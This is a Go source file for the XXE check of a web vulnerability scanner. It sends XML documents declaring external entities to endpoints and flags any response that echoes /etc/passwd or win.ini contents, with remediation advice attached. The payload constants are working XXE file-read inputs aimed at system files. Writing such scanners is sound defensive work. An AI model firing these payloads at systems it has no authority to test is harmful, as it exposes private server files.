// Package xxe implements an in-band XML External Entity (XXE) injection check.
//
// XXE is a property of how a request BODY is parsed, not of individual query
// parameters. This check POSTs an XML document to the endpoint URL that
// declares an external entity referencing a local file (file:///etc/passwd)
// and expands it in the document body. If the server's XML parser resolves
// external entities, the file contents are reflected back in-band and the
// response carries the distinctive /etc/passwd signature (root:...:0:0:).
//
// Detection gates strictly on the leaked file-content signature — never on a
// bare HTTP 200 — which keeps false positives low. When aggressive is set the
// probe is additionally repeated with a text/xml Content-Type and a Windows
// target file (file:///c:/windows/win.ini, matched by its "[extensions]"
// section). Only file-read (in-band) payloads are sent; no out-of-band or
// blind callbacks are used, so the probe is bounded.
package xxe

import (
	"context"
	"fmt"
	"regexp"
	"strings"
	"sync"
	"time"

	"github.com/reyjayswa/asfasf/internal/checks"
	"github.com/reyjayswa/asfasf/internal/httpclient"
)

// unixSig matches the leaked contents of a Unix /etc/passwd file, e.g. the
// root account line "root:x:0:0:root:/root:/bin/bash". This is distinctive
// proof that the external entity was resolved and the file was read.
var unixSig = regexp.MustCompile(`root:.*:0:0:`)

// winSig matches the "[extensions]" section header found in a Windows
// win.ini file, proving the c:/windows/win.ini entity was resolved.
var winSig = regexp.MustCompile(`\[extensions\]`)

// unixPayload declares an external entity that reads /etc/passwd and expands
// it in the document body.
const unixPayload = `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>`

// winPayload declares an external entity that reads c:/windows/win.ini.
const winPayload = `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>`

// Checker probes endpoints for in-band XML external entity injection.
type Checker struct {
	client     *httpclient.Client
	aggressive bool

	mu   sync.Mutex
	seen map[string]bool // endpoint URLs already probed
}

// New builds an XXE Checker. When aggressive is true a text/xml variant and a
// Windows win.ini file-read payload are additionally sent.
func New(client *httpclient.Client, aggressive bool) *Checker {
	return &Checker{client: client, aggressive: aggressive, seen: make(map[string]bool)}
}

// Name identifies the check.
func (c *Checker) Name() string { return "xxe" }

// probe describes a single XXE attempt: the XML payload, the Content-Type it
// is sent with, the signature that proves the referenced file was read, and a
// human-readable name of that file.
type probe struct {
	payload     string
	contentType string
	sig         *regexp.Regexp
	target      string // human-readable name of the file read
}

// Run POSTs the XXE probe(s) to the endpoint URL. It ignores ep.Params — XXE
// concerns the request body, not query parameters. Each distinct endpoint URL
// is probed at most once.
func (c *Checker) Run(ctx context.Context, ep checks.Endpoint) []checks.Finding {
	var findings []checks.Finding

	// Probe each distinct endpoint URL at most once.
	c.mu.Lock()
	if c.seen[ep.URL] {
		c.mu.Unlock()
		return findings
	}
	c.seen[ep.URL] = true
	c.mu.Unlock()

	probes := []probe{
		{payload: unixPayload, contentType: "application/xml", sig: unixSig, target: "/etc/passwd"},
	}
	if c.aggressive {
		probes = append(probes,
			probe{payload: unixPayload, contentType: "text/xml", sig: unixSig, target: "/etc/passwd"},
			probe{payload: winPayload, contentType: "application/xml", sig: winSig, target: "c:/windows/win.ini"},
			probe{payload: winPayload, contentType: "text/xml", sig: winSig, target: "c:/windows/win.ini"},
		)
	}

	for _, p := range probes {
		if err := ctx.Err(); err != nil {
			return findings
		}
		resp, err := c.client.Do(ctx, "POST", ep.URL, strings.NewReader(p.payload),
			map[string]string{"Content-Type": p.contentType})
		if err != nil || resp == nil {
			continue
		}
		if sig := p.sig.FindString(resp.BodyString()); sig != "" {
			findings = append(findings, checks.Finding{
				Type:        "xxe",
				Severity:    checks.SeverityCritical,
				Title:       "XML external entity (XXE) injection: local file read",
				URL:         ep.URL,
				Method:      "POST",
				Payload:     p.payload,
				Evidence:    checks.Truncate(sig, 240),
				Description: fmt.Sprintf("The endpoint parsed an XML document containing an external entity referencing %s and returned the file contents in the response, proving the XML parser resolves external entities from attacker-controlled input.", p.target),
				Remediation: "Disable external entity and DTD processing in the XML parser (e.g. set FEATURE_SECURE_PROCESSING, disallow-doctype-decl, and disable external-general-entities/external-parameter-entities). Prefer parsers configured to reject DOCTYPE declarations entirely.",
				Confidence:  "firm",
				Timestamp:   time.Now(),
				CWE:         "CWE-611",
			})
			// One firm finding per endpoint URL is enough.
			return findings
		}
	}

	return findings
}
